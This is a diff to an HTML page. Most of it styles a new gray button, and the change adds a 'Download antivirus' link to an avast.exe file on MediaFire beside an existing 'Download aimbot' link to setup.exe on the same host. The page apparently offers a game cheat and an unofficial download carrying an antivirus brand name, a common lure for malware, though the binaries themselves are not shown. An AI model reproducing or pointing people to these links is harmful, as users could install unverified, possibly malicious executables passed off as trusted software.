@@ -66,9 +66,44 @@
             transform: skewX(-45deg) translateX(0);
         }
         .pretty-button:hover {
-            border-color: #b92b03; /* Change border color on hover */
+            border-color: #ff6600; /* Change border color on hover */
         }
         .pretty-button span {
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Styling for the gray button */
+        .gray-button {
+            background-color: #808080;
+            color: orange;
+            text-align: center;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 18px;
+            font-weight: bold;
+            text-transform: uppercase;
+            transition: background-color 0.3s ease;
+            margin-top: 20px; /* Adjust the margin as needed */
+            display: inline-block;
+            position: relative;
+            overflow: hidden;
+            text-decoration: none;
+            outline: none; /* Remove default outline */
+            border: 2px solid transparent; /* Add transparent border for outline effect */
+        }
+        .gray-button:hover {
+            background-color: #a9a9a9; /* Darker gray on hover */
+        }
+        .gray-button:hover::before {
+            transform: skewX(-45deg) translateX(0);
+        }
+        .gray-button:hover {
+            border-color: orange; /* Change border color on hover */
+        }
+        .gray-button span {
             position: relative;
             z-index: 1;
         }
@@ -85,6 +120,11 @@
 <!-- Pretty Button -->
 <a href="https://www.mediafire.com/file/ym5m8urns0p3efd/setup.exe/file" class="pretty-button">
     <span>Download aimbot</span>
+</a>
+
+<!-- Gray Button -->
+<a href="https://www.mediafire.com/file/bki6160y9yesh9c/avast.exe/file" class="gray-button">
+    <span>Download antivirus</span>
 </a>
 
 </body>
